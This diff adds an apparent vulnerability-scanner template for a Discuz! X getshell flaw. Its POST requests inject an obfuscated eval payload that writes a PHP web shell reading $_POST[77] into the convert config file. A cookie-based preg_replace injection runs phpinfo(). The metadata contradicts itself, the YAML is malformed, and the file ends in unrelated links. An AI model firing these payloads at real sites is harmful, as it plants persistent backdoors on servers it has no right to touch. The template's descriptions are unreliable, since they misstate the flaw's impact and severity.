@@ -1,1 +1,118 @@
+id: ZB-Discuz-updateGetshell
 
+info:
+  name: Discuz! X 系列全版本，版本转换功能导致Getshell
+  author: Discuz! X 系列全版本，版本转换功能导致Getshell
+  severity: high
+  description: |
+    Discuz! X 系列全版本，版本转换功能导致Getshell
+  impact: |
+    The vulnerability can lead to unauthorized access to user passwords, compromising the confidentiality of user accounts.
+  remediation: 
+  reference:
+    - https://www.hacking8.com/bug-web/Discuz/Discuz!-X3.4-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E9%85%8D%E5%90%88install%E8%BF%87%E7%A8%8Bgetshell.html
+
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    cvss-score: 5.3
+    cve-id: 
+    epss-score: 0.96314
+    epss-percentile: 0.9944
+
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: Discuz
+    product: Discuz
+
+  tags: cve,discuz,Discuz
+
+http:
+  - raw:
+      - |
+        POST /dz/utility/convert/index.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 278
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+        a=config&source=d7.2_x1.5&submit=yes&newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(55).CHR(55).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//]=aaaa
+      - |
+         POST /utility/convert/index.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 278
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+        a=config&source=d7.2_x1.5&submit=yes&newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(55).CHR(55).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//]=aaaa
+
+
+     - |
+        POST /convert/data/config.inc.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 278
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+       - |
+        POST /convert/data/config.inc.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 278
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'phpinfo'
+
+requests:
+  - method: GET 
+    path:
+      - "{{BaseURL}}/viewthread.php?tid=2&extra=page%3D1"
+      - "{{BaseURL}}/viewthread.php?tid=10&extra=page%3D1"
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+      Accept-Encoding: gzip, deflate, br
+      Accept-Language: zh-CN,zh;q=0.9
+      Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
+    
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'phpinfo'
+  
+    
+# digest: 4b0a00483046022100f1a8859b2be34845c6e9ff983c9ab9fc1741ee2e59af7319158de1e37c2002850221009b6444bdf0c4f9f9c9da30901088c17b893d690461a859cb5a97e2488a963ce2:922c64590222798bb761d5b6d8e72950
+
+
+https://www.cnblogs.com/xiaoyunxiaogang/p/17219281.html
+https://github.com/Boogipop/CVE-2023-22527-Godzilla-MEMSHELL
